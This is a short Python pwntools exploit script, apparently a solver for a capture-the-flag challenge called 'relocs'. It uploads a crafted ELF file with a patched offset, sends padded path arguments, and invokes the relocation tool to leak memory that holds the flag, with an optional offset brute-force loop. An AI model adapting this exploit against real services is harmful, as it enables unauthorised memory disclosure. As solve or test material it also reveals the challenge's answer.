#!/usr/bin/env python3
from pwn import args, remote, p16, logging
from pathlib import Path

logging.disable()
base = Path(__file__).parent / "chall"
# exe = context.binary = ELF(str(base / 'relocs'))

host = args.HOST or 'localhost'
port = int(args.PORT) or 10016


OFFSET = 100

with open(str(base / "exploitelf"), "rb") as f:
    expbase = (f.read())


def leak_at_off(off):
    io = remote(host, port)

    def flush(): return io.recvuntil(b'> ')

    flush()
    io.sendline(b'upload /tmp/kekkus')
    io.sendline(expbase.replace(b'\x20\x24', p16(off)))
    flush()
    io.sendline(b'/tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa /tmp/aaaaaaaaaaaaaaaaaaaaaaaaaaa')
    flush()
    # > print_flag
    io.sendline(b'print_flag')
    flush()
    # > relocs /tmp/exploitelf --abs-syms
    io.sendline(b'relocs /tmp/kekkus --abs-syms')
    io.sendline(b'exit')
    lol = io.recvall()
    return lol


def main():
    if args.BRUTE:
        for i in range(10000):
            leak_at_off(OFFSET + i * 60)
        return

    if b'ifctf' in leak_at_off(8736):
        print("OK - found flag")
        exit(0)
    else:
        print("ERR - Flag not found running exp")
        exit(1)


if __name__ == "__main__":
    main()
